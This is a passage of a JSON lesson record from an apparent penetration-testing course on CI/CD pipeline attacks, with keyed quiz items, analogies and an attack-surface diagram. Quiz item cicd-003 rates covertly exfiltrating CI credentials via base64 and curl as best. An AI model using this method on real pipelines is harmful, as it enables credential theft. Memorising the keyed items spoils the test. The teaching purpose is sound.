{
  "lesson_id": "c7a8b9c0-e1f2-4a3b-4c5d-6e7f8a9b0c1d",
  "domain": "cloud",
  "title": "CI/CD Pipeline Attacks: Compromising DevOps Infrastructure",
  "difficulty": 3,
  "order_index": 123,
  "prerequisites": ["b6f7a8b9-d0e1-4f2a-3b4c-5d6e7f8a9b0c"],
  "concepts": [
    "CI/CD pipeline architecture and attack surface",
    "Source code repository compromise (GitHub, GitLab, Bitbucket)",
    "CI/CD secret extraction (credentials, API keys, tokens)",
    "Build server exploitation (Jenkins, GitLab CI, GitHub Actions)",
    "Pipeline injection and poisoned pipeline execution",
    "Artifact repository attacks (container registries, package repos)",
    "Supply chain attacks via dependencies",
    "Infrastructure as Code (IaC) exploitation",
    "Deployment pipeline privilege escalation",
    "Cloud deployment credential theft"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand CI/CD pipeline architectures and trust boundaries",
    "Compromise source code repositories to inject malicious code",
    "Extract secrets from CI/CD environment variables and vault systems",
    "Exploit CI/CD build servers and agents for code execution",
    "Execute poisoned pipeline attacks (PPE) to compromise deployments",
    "Attack artifact repositories and container registries",
    "Perform supply chain attacks via dependency confusion",
    "Exploit Infrastructure as Code templates for persistence",
    "Escalate privileges through deployment pipelines",
    "Implement detection and defense strategies for CI/CD security"
  ],
  "post_assessment": [
    {
      "question_id": "cicd-001",
      "question": "What is the MOST dangerous aspect of compromising a CI/CD pipeline versus traditional infrastructure?",
      "options": [
        "CI/CD systems have more CPU resources for cryptomining",
        "CI/CD pipelines have deployment credentials for production environments",
        "CI/CD servers run older, unpatched operating systems",
        "CI/CD systems are easier to access via phishing attacks"
      ],
      "correct_answer": 1,
      "explanation": "CI/CD pipelines have deployment credentials and permissions to production environments (cloud credentials, Kubernetes service accounts, SSH keys, database passwords). Compromising a CI/CD pipeline gives attackers a direct path to production systems, the ability to inject backdoors into code, and persistent access through automated deployments. This is far more valuable than compute resources or easier access. CI/CD compromise is a force multiplier that turns one breach into organization-wide access.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "cicd-002",
      "question": "In a 'Poisoned Pipeline Execution' (PPE) attack, what allows an attacker to execute malicious code in the CI/CD environment?",
      "options": [
        "SQL injection in the pipeline configuration interface",
        "Modifying pipeline configuration files (e.g., .gitlab-ci.yml, Jenkinsfile) in a pull request",
        "Brute-forcing Jenkins administrator passwords",
        "Exploiting unpatched vulnerabilities in the CI/CD server OS"
      ],
      "correct_answer": 1,
      "explanation": "Poisoned Pipeline Execution (PPE) attacks work by modifying pipeline configuration files (.gitlab-ci.yml, .github/workflows/*.yml, Jenkinsfile, azure-pipelines.yml) in a pull request or commit. When the CI/CD system processes the modified configuration, it executes the attacker's malicious commands. Many CI/CD systems execute pipeline configurations from branches/PRs before code review approval, creating a dangerous attack vector. This is a design flaw, not a traditional vulnerability or authentication bypass.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "cicd-003",
      "question": "An attacker discovers AWS credentials in a GitHub Actions workflow environment variable. What is the BEST way to exfiltrate them without triggering alerts?",
      "options": [
        "Print the credentials directly to workflow logs (they're visible in Actions output)",
        "Base64-encode credentials and POST to attacker-controlled server via curl",
        "Store credentials in a GitHub release artifact for later download",
        "Email credentials using the built-in GitHub notification system"
      ],
      "correct_answer": 1,
      "explanation": "Base64-encoding and exfiltrating via HTTP POST to an external server is the most covert method. Printing credentials to logs risks them being masked by secret detection systems (GitHub masks known patterns). Release artifacts are logged and monitored. Email notifications don't support arbitrary content. The best approach is encoding (to bypass pattern matching) and using standard HTTP tools (curl, wget) that are common in CI/CD environments and won't trigger anomaly detection. Using DNS exfiltration or steganography would be even more covert.",
      "type": "multiple_choice",
      "difficulty": 3
    },
    {
      "question_id": "cicd-004",
      "question": "What is 'dependency confusion' in the context of CI/CD supply chain attacks?",
      "options": [
        "When a project has circular dependencies causing build failures",
        "When attackers upload malicious packages with the same name as internal private packages to public repositories",
        "When outdated dependencies cause security vulnerabilities",
        "When multiple versions of the same package create conflicts"
      ],
      "correct_answer": 1,
      "explanation": "Dependency confusion (also called substitution attack) exploits how package managers resolve dependencies. Organizations often use private packages (e.g., 'internal-auth-lib') alongside public packages. Attackers discover internal package names (via error messages, leaked configs, or enumeration) and publish malicious packages with the same names to public repositories (npm, PyPI, Maven Central). If the build system checks public repos first or prefers newer versions, it downloads the attacker's malicious package instead of the legitimate internal one. This technique compromised major companies including Microsoft, Apple, and PayPal in 2021.",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question_id": "cicd-005",
      "question": "Which CI/CD security practice is MOST effective at preventing malicious code injection via pull requests?",
      "options": [
        "Requiring all contributors to use two-factor authentication",
        "Separating pipeline execution contexts: untrusted code runs in restricted environments without secrets",
        "Running daily vulnerability scans on all dependencies",
        "Implementing code review requirements for all pull requests"
      ],
      "correct_answer": 1,
      "explanation": "Separating pipeline execution contexts is the most effective defense. Untrusted code (from PRs, especially from external contributors) should run in restricted environments without access to secrets, production credentials, or deployment permissions. Trusted code (from main branch after approval) runs in privileged contexts with deployment capabilities. 2FA prevents account compromise but doesn't stop malicious PRs from legitimate accounts. Vulnerability scans don't detect intentional malicious code. Code review is important but humans miss malicious logic disguised as legitimate changes. Context separation provides architectural defense.",
      "type": "multiple_choice",
      "difficulty": 3
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "Welcome to CI/CD Pipeline Security! ğŸš€ğŸ”’\n\nYou're about to master one of the most critical and often overlooked attack surfaces in modern organizations: **the software delivery pipeline**. This isn't just about breaking applicationsâ€”it's about compromising the **factory that builds all applications**.\n\n**Why CI/CD Pipelines Are the Ultimate Target:**\n\nğŸ¯ **One compromise = Access to everything**: CI/CD pipelines have deployment credentials for production, staging, and dev environments\n\nğŸ¯ **Persistent backdoor factory**: Inject malicious code once, it deploys automatically to all systems\n\nğŸ¯ **Trusted by design**: Code from CI/CD is assumed safe, bypassing security controls\n\nğŸ¯ **Supply chain multiplier**: One compromised pipeline can affect thousands of customers\n\n**Real-World Devastation:**\n\nğŸ’¥ **SolarWinds (2020)**: Attackers compromised CI/CD build systems â†’ injected backdoor â†’ 18,000+ organizations infected\n\nğŸ’¥ **CodeCov (2021)**: CI/CD script compromise â†’ credentials stolen from 29,000+ customers' pipelines\n\nğŸ’¥ **Dependency Confusion (2021)**: $130,000 in bug bounties by uploading malicious packages â†’ Microsoft, Apple, PayPal, Tesla compromised\n\nğŸ’¥ **GitHub Actions Supply Chain**: Multiple incidents of attackers stealing secrets from public workflow logs\n\n**What You'll Master:**\n\nBy the end of this lesson, you'll know how to:\n- Compromise source code repositories and inject malicious code\n- Extract secrets from CI/CD environment variables and vaults\n- Execute poisoned pipeline attacks that run malicious code during builds\n- Perform supply chain attacks via dependency confusion\n- Escalate from CI/CD to production cloud infrastructure\n- Detect and defend against CI/CD attacks\n\n**Why This Is Your Superpower:**\n\nMost security teams focus on:\n- âœ… Application security (WAFs, code scanning)\n- âœ… Infrastructure security (firewalls, EDR)\n- âœ… Identity security (MFA, IAM)\n\nBut they **neglect** CI/CD security:\n- âŒ Jenkins servers with default credentials\n- âŒ GitHub Actions workflows with hardcoded AWS keys\n- âŒ GitLab CI pipelines processing untrusted code with full secrets\n- âŒ Container registries with no authentication\n\n**You're about to learn attacks that bypass ALL traditional security controls.**\n\nWhen you compromise the CI/CD pipeline:\n- Application security doesn't matter (you control the code)\n- Infrastructure security doesn't matter (you have deployment credentials)\n- Identity security doesn't matter (you have service account tokens)\n\n**This is the skeleton key to the modern organization.**\n\nYou've built the foundation:\n- âœ… Cloud pentesting methodology\n- âœ… Identity attacks (Entra ID, AWS IAM)\n- âœ… Compute exploitation (VMs, containers)\n- âœ… Cloud-native application attacks\n\nNow you're attacking the **software supply chain itself**.\n\n**Challenge**: CI/CD security requires thinking in 4 dimensions:\n1. **Code**: What malicious code can you inject?\n2. **Credentials**: What secrets can you extract?\n3. **Infrastructure**: What systems can you compromise?\n4. **Persistence**: How do you maintain access?\n\nBy the end of this lesson, you'll think like the attackers who compromised SolarWinds, CodeCov, and major supply chain breaches.\n\n**Remember**: These techniques are for authorized penetration testing, red team operations, and CTF competitions only. Unauthorized access is illegal and unethical.\n\nLet's break the build pipeline! ğŸ’ª\n\n**Fun fact**: The SolarWinds attackers had access for **18 months** before detection. CI/CD compromises are invisible, persistent, and devastating. That's why you need to master themâ€”both to exploit and defend."
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Teach Me Like I'm 10: What Are CI/CD Pipelines?\n\nImagine you're running a bakery that makes cookies. Let's compare different ways to make cookies:\n\n**Old Way (Manual Deployment) = Making Cookies by Hand**\n- You mix ingredients by hand\n- You shape each cookie individually\n- You watch the oven and take cookies out when done\n- If you make a mistake, you start over\n- **Slow**: Takes hours to make 100 cookies\n\n**New Way (CI/CD Pipeline) = Cookie-Making Robot Factory**\n- You write instructions for the robot (recipe = code)\n- Robot automatically mixes ingredients (build)\n- Robot tests cookies (automated tests)\n- Robot packages cookies (containerization)\n- Robot delivers cookies to stores (deployment)\n- **Fast**: Makes 1,000 cookies per hour automatically!\n\n### What Is CI/CD?\n\n**CI = Continuous Integration**\n- \"Integration\" means combining everyone's work\n- Like multiple chefs adding their recipes to the robot\n- Every time someone changes the recipe, the robot tries making a cookie\n- If the recipe is bad, robot says \"ERROR! This won't work!\"\n\n**CD = Continuous Deployment**\n- \"Deployment\" means delivering cookies to stores\n- Robot automatically delivers good cookies to customers\n- No human needs to drive the delivery truck\n- Happens automatically every time cookies are ready\n\n### The CI/CD Pipeline = The Robot Factory\n\n```\n1. DEVELOPER writes code\n      â†“\n2. CODE REPOSITORY (GitHub) stores code\n      â†“\n3. BUILD SERVER (Jenkins) makes the program\n      â†“\n4. TESTING (automated tests) checks if it works\n      â†“\n5. ARTIFACT STORAGE (Docker Hub) saves the package\n      â†“\n6. DEPLOYMENT (Kubernetes) delivers to customers\n```\n\n**Like a Cookie Factory:**\n```\n1. CHEF writes recipe\n      â†“\n2. RECIPE BOOK stores recipe\n      â†“\n3. MIXING ROBOT makes cookie dough\n      â†“\n4. TASTE TESTER checks if cookies taste good\n      â†“\n5. PACKAGING ROBOT puts cookies in boxes\n      â†“\n6. DELIVERY TRUCK takes cookies to stores\n```\n\n### Why Do Bad Guys Attack CI/CD Pipelines?\n\n**Story Time: The Poisoned Cookie Factory**\n\nImagine a bad guy wants to poison cookies. They have 3 options:\n\n**Option 1: Poison ONE cookie**\n- Sneak into a store\n- Poison one cookie\n- Only one customer gets sick\n- **Hard to do, low impact**\n\n**Option 2: Poison MANY cookies**\n- Break into every store in the city\n- Poison cookies in each store\n- Many customers get sick\n- **Very hard, medium impact**\n\n**Option 3: Poison THE COOKIE FACTORY (CI/CD Attack!)**\n- Break into the robot factory ONCE\n- Add poison to the robot's recipe\n- Robot puts poison in EVERY cookie\n- Robot delivers poisoned cookies to ALL stores\n- Robot does this FOREVER (until someone notices)\n- Thousands of customers get sick\n- **Easy once inside, MASSIVE impact**\n\n**That's why attackers target CI/CD pipelines!**\n\n### Real Attack Example: The SolarWinds Hack\n\n**What Happened (Cookie Story Version):**\n\n1. **Bad guys broke into a software factory** (SolarWinds company)\n2. **They modified the factory robot** (build server)\n3. **Robot added poison to software** (backdoor code)\n4. **Software was delivered to 18,000 companies** (including US government)\n5. **Bad guys could spy on all those companies** (data theft)\n6. **Took 18 months to discover!**\n\n**In Technical Terms:**\n- Attackers compromised SolarWinds' CI/CD pipeline\n- Injected malware into Orion software during build process\n- Legitimate software updates contained backdoors\n- 18,000+ organizations installed compromised software\n- Attackers gained persistent access to government and corporate networks\n\n### What Do Attackers Steal from CI/CD Pipelines?\n\n**1. Secret Recipes (Credentials)**\n- Cloud passwords (AWS, Azure, GCP keys)\n- Database passwords\n- API keys for services\n- SSH keys for servers\n\n**Cookie analogy**: Stealing the key to the ingredient vault\n\n**2. The Recipe Book (Source Code)**\n- Proprietary software code\n- Security vulnerabilities in code\n- Business logic and algorithms\n\n**Cookie analogy**: Stealing the secret cookie recipe\n\n**3. Factory Access (Build Server Control)**\n- Ability to modify any code\n- Ability to deploy to production\n- Ability to inject backdoors\n\n**Cookie analogy**: Controlling the robot that makes all cookies\n\n**4. Delivery Trucks (Deployment Credentials)**\n- Kubernetes cluster access\n- Production server SSH keys\n- Cloud infrastructure permissions\n\n**Cookie analogy**: Stealing the keys to all delivery trucks\n\n### How Do Attackers Break Into CI/CD?\n\n**Method 1: Break the Lock (Weak Passwords)**\n- Jenkins with admin/admin password\n- GitHub account without 2FA\n- GitLab with default credentials\n\n**Cookie analogy**: Factory door has a weak lock, easy to break\n\n**Method 2: Trick the Chef (Phishing)**\n- Send fake email to developer\n- Steal their GitHub/GitLab password\n- Use their account to access pipeline\n\n**Cookie analogy**: Pretend to be the manager, chef gives you the keys\n\n**Method 3: Poison the Recipe Book (Malicious Pull Request)**\n- Submit \"helpful\" code changes\n- Hide malicious commands in build scripts\n- When robot reads recipe, it executes malicious code\n\n**Cookie analogy**: Suggest a \"better recipe\" that secretly adds poison\n\n**Method 4: Use Fake Ingredients (Dependency Confusion)**\n- Robot needs \"sugar\" package\n- Attacker creates fake \"sugar\" package with poison\n- Robot downloads fake sugar instead of real sugar\n- Poison ends up in all cookies\n\n**Cookie analogy**: Swapping real sugar with poisoned fake sugar\n\n### How Do We Protect the Cookie Factory (CI/CD)?\n\n**1. Strong Locks**\n- Use strong passwords and 2FA\n- Don't leave factory keys lying around\n- Change locks regularly\n\n**2. Trust But Verify**\n- Check every recipe before robot uses it\n- Test ingredients before mixing\n- Inspect cookies before delivery\n\n**3. Separate Trusted and Untrusted**\n- Visitor recipes tested in separate kitchen (no access to real ingredients)\n- Only approved recipes go to main factory\n- Delivery robots only trust approved chefs\n\n**4. Watch the Factory**\n- Cameras everywhere (logging)\n- Alarm if someone tries to break in (monitoring)\n- Inspector checks cookies regularly (security scans)\n\n---\n\n**Bottom Line**: CI/CD pipelines are like robot factories that automatically build and deliver software. If bad guys break into the factory, they can poison everything the factory makes. That's why CI/CD security is super important!\n\nYour job as a security professional? Either break into the factory (pentesting) or protect the factory (defense). Let's learn both! ğŸªğŸ”’"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## CI/CD Pipeline Architecture and Attack Surface\n\nUnderstanding the complete CI/CD pipeline architecture is essential for both attacking and defending these systems.\n\n### Complete CI/CD Pipeline Flow\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    DEVELOPMENT PHASE                            â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚  Developer Workstation                                          â”‚\nâ”‚  â”œâ”€â”€ IDE (VS Code, IntelliJ)                                   â”‚\nâ”‚  â”œâ”€â”€ Git client                                                 â”‚\nâ”‚  â”œâ”€â”€ Local credentials (~/.aws, ~/.kube, ~/.docker)            â”‚\nâ”‚  â””â”€â”€ SSH keys (~/.ssh)                                          â”‚\nâ”‚         â”‚                                                       â”‚\nâ”‚         â”‚ git push                                              â”‚\nâ”‚         â–¼                                                       â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚\n         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                SOURCE CODE MANAGEMENT (SCM)                     â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚  ğŸ¯ ATTACK TARGET #1: Source Code Repository                   â”‚\nâ”‚                                                                 â”‚\nâ”‚  GitHub / GitLab / Bitbucket / Azure DevOps                    â”‚\nâ”‚  â”œâ”€â”€ Source code repositories                                   â”‚\nâ”‚  â”œâ”€â”€ Branch protection rules                                    â”‚\nâ”‚  â”œâ”€â”€ Pull requests and code review                             â”‚\nâ”‚  â”œâ”€â”€ Webhooks (trigger CI/CD)                                  â”‚\nâ”‚  â”œâ”€â”€ Secrets management (encrypted variables)                   â”‚\nâ”‚  â””â”€â”€ Access tokens and SSH deploy keys                         â”‚\nâ”‚                                                                 â”‚\nâ”‚  Attack Vectors:                                                â”‚\nâ”‚  â€¢ Compromised developer accounts (phishing, password reuse)    â”‚\nâ”‚  â€¢ Leaked access tokens in public repos                        â”‚\nâ”‚  â€¢ Malicious pull requests with poisoned configs               â”‚\nâ”‚  â€¢ Secrets in commit history                                    â”‚\nâ”‚  â€¢ Weak branch protection (allow force push)                   â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚\n         â”‚ Webhook trigger (on push/PR)\n         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚             CONTINUOUS INTEGRATION (CI) PHASE                   â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚  ğŸ¯ ATTACK TARGET #2: CI Build Servers                         â”‚\nâ”‚                                                                 â”‚\nâ”‚  Jenkins / GitLab CI / GitHub Actions / CircleCI / Travis      â”‚\nâ”‚  â”œâ”€â”€ Build agents/runners                                       â”‚\nâ”‚  â”œâ”€â”€ Pipeline configuration (.gitlab-ci.yml, Jenkinsfile)      â”‚\nâ”‚  â”œâ”€â”€ Environment variables (secrets, credentials)              â”‚\nâ”‚  â”œâ”€â”€ Build scripts (npm, pip, maven, docker)                   â”‚\nâ”‚  â”œâ”€â”€ Test execution                                             â”‚\nâ”‚  â””â”€â”€ Artifact generation                                        â”‚\nâ”‚                                                                 â”‚\nâ”‚  Attack Vectors:                                                â”‚\nâ”‚  â€¢ Default credentials (admin:admin on Jenkins)                â”‚\nâ”‚  â€¢ Poisoned pipeline execution (PPE) - malicious config files  â”‚\nâ”‚  â€¢ Environment variable extraction                              â”‚\nâ”‚  â€¢ Command injection in build scripts                           â”‚\nâ”‚  â€¢ Dependency confusion / supply chain attacks                  â”‚\nâ”‚  â€¢ Vulnerable plugins                                           â”‚\nâ”‚  â€¢ Insecure deserialization                                     â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚\n         â”‚ Publish artifacts\n         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                  ARTIFACT REPOSITORIES                          â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚  ğŸ¯ ATTACK TARGET #3: Artifact Storage                         â”‚\nâ”‚                                                                 â”‚\nâ”‚  Docker Hub / ECR / ACR / GCR / JFrog Artifactory / Nexus      â”‚\nâ”‚  â”œâ”€â”€ Container images                                           â”‚\nâ”‚  â”œâ”€â”€ Binary packages (jar, war, zip)                           â”‚\nâ”‚  â”œâ”€â”€ npm/PyPI/Maven packages                                    â”‚\nâ”‚  â””â”€â”€ Helm charts and Kubernetes manifests                      â”‚\nâ”‚                                                                 â”‚\nâ”‚  Attack Vectors:                                                â”‚\nâ”‚  â€¢ Unauthenticated access to registries                        â”‚\nâ”‚  â€¢ Image tampering (modify existing images)                    â”‚\nâ”‚  â€¢ Malicious images with backdoors                             â”‚\nâ”‚  â€¢ Dependency confusion attacks                                 â”‚\nâ”‚  â€¢ Vulnerable base images                                       â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚\n         â”‚ Deploy trigger\n         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚          CONTINUOUS DEPLOYMENT (CD) PHASE                       â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚                                                                 â”‚\nâ”‚  ğŸ¯ ATTACK TARGET #4: Deployment Systems                       â”‚\nâ”‚                                                                 â”‚\nâ”‚  Kubernetes / ECS / Lambda / Ansible / Terraform / ArgoCD      â”‚\nâ”‚  â”œâ”€â”€ Deployment credentials (kubeconfig, AWS keys)             â”‚\nâ”‚  â”œâ”€â”€ Infrastructure as Code (IaC) templates                    â”‚\nâ”‚  â”œâ”€â”€ Secrets management (Vault, Secrets Manager)              â”‚\nâ”‚  â”œâ”€â”€ Service accounts and roles                                 â”‚\nâ”‚  â””â”€â”€ Production environment access                              â”‚\nâ”‚                                                                 â”‚\nâ”‚  Attack Vectors:                                                â”‚\nâ”‚  â€¢ Hardcoded credentials in IaC                                â”‚\nâ”‚  â€¢ Overprivileged service accounts                             â”‚\nâ”‚  â€¢ Insecure Terraform state files                              â”‚\nâ”‚  â€¢ Kubernetes RBAC misconfigurations                           â”‚\nâ”‚  â€¢ Secrets in environment variables                             â”‚\nâ”‚                                                                 â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n         â”‚\n         â”‚ Deployment complete\n         â–¼\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    PRODUCTION ENVIRONMENT                       â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  AWS / Azure / GCP / On-Premises                               â”‚\nâ”‚  â”œâ”€â”€ Application servers                                        â”‚\nâ”‚  â”œâ”€â”€ Databases                                                  â”‚\nâ”‚  â”œâ”€â”€ Storage                                                    â”‚\nâ”‚  â””â”€â”€ Monitoring and logging                                     â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n### Trust Boundaries in CI/CD\n\nUnderstanding trust boundaries is critical:\n\n**Trusted Zones (High Privilege)**:\n- Main branch (after code review)\n- Protected branches (release/*)\n- Build agents running approved code\n- Deployment pipelines with production credentials\n\n**Untrusted Zones (Low Privilege)**:\n- Pull requests (especially from external contributors)\n- Feature branches\n- Forked repositories\n- Developer workstations\n\n**The Security Problem**: Many CI/CD systems don't properly isolate trusted and untrusted zones!\n\n### Common CI/CD Platforms and Attack Surfaces\n\n#### 1. Jenkins\n\n**Architecture**:\n- Master server (orchestrates builds)\n- Build agents (execute jobs)\n- Plugins (extend functionality)\n\n**Attack Vectors**:\n```\nâ€¢ Default credentials: admin:admin (surprisingly common)\nâ€¢ Groovy script console: Execute arbitrary code as Jenkins user\nâ€¢ Vulnerable plugins: Hundreds of security issues\nâ€¢ Unsecured agents: Agents connect without authentication\nâ€¢ Exposed /script endpoint: Remote code execution\nâ€¢ Job configuration injection: Malicious build steps\nâ€¢ Credential theft: Stored credentials accessible to jobs\n```\n\n**Famous Jenkins Exploits**:\n- CVE-2024-23897: Arbitrary file read leading to RCE\n- CVE-2019-1003000: Script Security sandbox bypass\n- CVE-2018-1000861: Stapler web framework RCE\n\n#### 2. GitHub Actions\n\n**Architecture**:\n- Workflow files (.github/workflows/*.yml)\n- GitHub-hosted runners or self-hosted runners\n- Secrets stored in repository/organization settings\n\n**Attack Vectors**:\n```\nâ€¢ Workflow injection: Malicious .github/workflows files in PRs\nâ€¢ Secret exfiltration: Printing secrets to logs\nâ€¢ Pull request workflows: Running untrusted code with secrets\nâ€¢ Self-hosted runner compromise: Persistent access to infrastructure\nâ€¢ Action supply chain: Malicious third-party actions\nâ€¢ GITHUB_TOKEN abuse: Overprivileged default token\n```\n\n#### 3. GitLab CI/CD\n\n**Architecture**:\n- .gitlab-ci.yml pipeline configuration\n- GitLab Runners (execute jobs)\n- CI/CD variables (secrets management)\n\n**Attack Vectors**:\n```\nâ€¢ Pipeline configuration injection: Malicious 